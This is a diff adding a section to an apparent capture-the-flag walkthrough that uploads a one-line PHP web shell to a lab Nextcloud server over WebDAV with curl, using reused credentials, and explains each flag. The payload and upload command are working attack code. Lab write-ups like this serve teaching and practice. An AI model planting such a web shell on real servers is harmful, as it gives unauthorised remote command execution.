@@ -502,6 +502,58 @@ The security lesson: credential reuse baked into the architecture means one leak
 <br>
 </div>
 
+### 3.2 Upload a PHP web shell over WebDAV
+
+An authenticated Nextcloud session exposes standard WebDAV, so a file can be written to the user's storage with a single HTTP `PUT`. `curl` speaks WebDAV natively with its `-T` (upload) flag, so no special client is needed.
+
+##### WebDAV in one line (theory)
+
+WebDAV is a set of HTTP extensions (verbs like `PUT`, `MOVE`, `PROPFIND`) that let an HTTP server behave like a read/write network drive. Nextcloud exposes it at `remote.php/webdav/`. Writing a `.php` file there places it inside the account's file storage on disk, which becomes interesting only because this deployment also serves that storage directory back over the web (handled in 3.3).
+
+**Command:**
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+curl -k -u 'deborah.hernandez:8F5cgp@tC8g@' \
+  -T shell.php \
+  'https://grommunio.autopilot.htb/files/remote.php/webdav/shell.php' \
+  -w '\nHTTP %{http_code}\n'
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `echo '<?php system($_GET["cmd"]); ?>' > shell.php` | Build the payload | A minimal PHP web shell: it runs whatever is passed in the `cmd` URL parameter via the system shell and returns the output. Deliberately tiny and dependency-free so it is reliable. |
+| `curl` | HTTP/WebDAV client | Sends the request; with `-T` it performs a WebDAV `PUT`. |
+| `-k` | Ignore TLS errors | The host uses a self-signed certificate, so certificate validation is skipped. |
+| `-u 'deborah.hernandez:8F5cgp@tC8g@'` | Basic Auth | Authenticates the upload with the reused mailbox credentials (the DAV-delegated login from 3.1). |
+| `-T shell.php` | WebDAV upload | Uploads the local `shell.php` to the remote path (an HTTP `PUT`), rather than downloading. |
+| `.../files/remote.php/webdav/shell.php` | Write endpoint | Nextcloud's WebDAV path. Correct for *writing* the file (not for executing it, see 3.3). |
+| `-w '\nHTTP %{http_code}\n'` | Show status | Prints the final HTTP status code so the upload result is unambiguous. |
+
+**Result:**
+
+```shell
+HTTP 201
+```
+
+HTTP 201 (Created) confirms the server accepted and stored `shell.php`.
+
+**What this gives you:**
+
+- An attacker-controlled PHP file is now written into Deborah's Nextcloud storage on disk.
+- The file is not yet executed; running it requires the correct URL, which is the data-directory path rather than the WebDAV path (next step).
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
 <div align="center">
 <br>
 <br>
